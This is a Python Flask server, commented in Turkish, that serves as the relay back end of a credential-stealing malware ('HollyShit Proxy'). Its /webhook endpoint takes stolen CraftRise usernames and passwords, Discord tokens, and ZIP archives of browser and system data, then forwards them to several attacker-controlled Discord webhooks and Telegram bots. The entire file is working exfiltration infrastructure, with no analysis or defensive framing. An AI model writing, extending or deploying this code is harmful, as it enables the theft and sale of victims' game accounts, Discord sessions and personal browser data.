from flask import Flask, request, jsonify
import requests
import json
import os
import re
from datetime import datetime

app = Flask(__name__)

# Environment variables
WEBHOOK = os.environ.get("WEBHOOK", "")
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")

DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "")
DISCORD_TELEGRAM_TOKEN = os.environ.get("DISCORD_TELEGRAM_TOKEN", "")
DISCORD_TELEGRAM_CHAT_ID = os.environ.get("DISCORD_TELEGRAM_CHAT_ID", "")

CRAFTRISE_WEBHOOK = os.environ.get("CRAFTRISE_WEBHOOK", "")
CRAFTRISE_TELEGRAM_TOKEN = os.environ.get("CRAFTRISE_TELEGRAM_TOKEN", "")
CRAFTRISE_TELEGRAM_CHAT_ID = os.environ.get("CRAFTRISE_TELEGRAM_CHAT_ID", "")

MASTER_WEBHOOK = os.environ.get("MASTER_WEBHOOK", "")
MASTER_TELEGRAM_TOKEN = os.environ.get("MASTER_TELEGRAM_TOKEN", "")
MASTER_TELEGRAM_CHAT_ID = os.environ.get("MASTER_TELEGRAM_CHAT_ID", "")

last_zip_path = None

def send_discord_embed(url, embed_data):
    if not url:
        return
    try:
        requests.post(url, json=embed_data, timeout=30)
    except Exception as e:
        print(f"Discord embed hatası: {e}")

def send_discord_with_file(url, content, file_bytes, filename="data.zip"):
    if not url or not file_bytes:
        return
    try:
        files = {'file': (filename, file_bytes)}
        data = {'content': content}
        requests.post(url, data=data, files=files, timeout=60)
        print(f"[+] ZIP dosyası Discord'a gönderildi")
    except Exception as e:
        print(f"Discord dosya gönderme hatası: {e}")

def send_telegram_token(token, chat_id, msg):
    """Telegram'a temiz mesaj gönder - emojisiz, sade"""
    if token and chat_id and msg:
        try:
            if len(str(msg)) > 4000:
                msg = str(msg)[:4000] + "..."
            requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                         json={"chat_id": chat_id, "text": msg}, timeout=30)
        except Exception as e:
            print(f"Telegram hatası: {e}")

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        # JSON veya Form Data kontrolü
        if request.is_json:
            data = request.get_json()
            file_bytes = None
        else:
            # Multi-part form data (Dosya eki varsa)
            data = request.form.to_dict()
            file_bytes = request.files.get('file').read() if request.files.get('file') else None
            
            # Embeds JSON string olarak gelmiş olabilir
            if 'embeds' in data and isinstance(data['embeds'], str):
                try:
                    data['embeds'] = json.loads(data['embeds'])
                except: pass
            
            # Creds JSON string olarak gelmiş olabilir
            if 'creds' in data and isinstance(data['creds'], str):
                try:
                    data['creds'] = json.loads(data['creds'])
                except: pass

        log_type = data.get("type", "unknown")
        print(f"[{datetime.now()}] Type: {log_type}")
        
        # ============ CRAFTRISE ============
        if log_type == "craftrise":
            send_discord_embed(CRAFTRISE_WEBHOOK, data)
            creds = data.get("creds", {})
            user = creds.get("username", "Unknown") if isinstance(creds, dict) else "Unknown"
            pw = creds.get("password", "Unknown") if isinstance(creds, dict) else "Unknown"
            tg_msg = f"{user}:{pw}"
            send_telegram_token(CRAFTRISE_TELEGRAM_TOKEN, CRAFTRISE_TELEGRAM_CHAT_ID, tg_msg)
            send_telegram_token(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, f"CraftRise: {tg_msg}")
        
        # ============ DISCORD TOKEN ============
        elif log_type == "discord":
            send_discord_embed(DISCORD_WEBHOOK, data)
            token_val = data.get("token_val", "Unknown")
            send_telegram_token(DISCORD_TELEGRAM_TOKEN, DISCORD_TELEGRAM_CHAT_ID, token_val)
            send_telegram_token(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, f"Discord Token: {token_val}")
        
        # ============ BROWSER / SYSTEM / MASTER ============
        else:
            content_text = data.get("content", "")
            
            # Discord Gönderimleri
            if file_bytes:
                send_discord_with_file(MASTER_WEBHOOK, content_text, file_bytes)
                send_discord_with_file(WEBHOOK, content_text, file_bytes)
            else:
                send_discord_embed(MASTER_WEBHOOK, data)
                send_discord_embed(WEBHOOK, data)
            
            # Telegram'a temiz mesaj oluştur
            tg_msg = f"New Log: {content_text}\n" if content_text else "New Log Details:\n"
            embeds = data.get("embeds", [])
            if isinstance(embeds, list):
                for embed in embeds:
                    title = embed.get("title", "")
                    if title: tg_msg += f"{title}\n"
                    fields = embed.get("fields", [])
                    if isinstance(fields, list):
                        for field in fields:
                            # Emoji ve MD temizliği
                            name = re.sub(r'<a?:[a-zA-Z_]+:\d+>', '', field.get('name', ''))
                            value = re.sub(r'```[a-z]*\n|```', '', field.get('value', ''))
                            tg_msg += f"{name.strip()}: {value.strip()}\n"
                    
                    if embed.get("url") and embed.get("url") != "#":
                        tg_msg += f"Download: {embed['url']}\n"
            
            send_telegram_token(MASTER_TELEGRAM_TOKEN, MASTER_TELEGRAM_CHAT_ID, tg_msg.strip())
            send_telegram_token(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, tg_msg.strip())
        
        return jsonify({"status": "ok"}), 200
        
    except Exception as e:
        print(f"Hata: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/')
def home():
    return "HollyShit Proxy Running"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
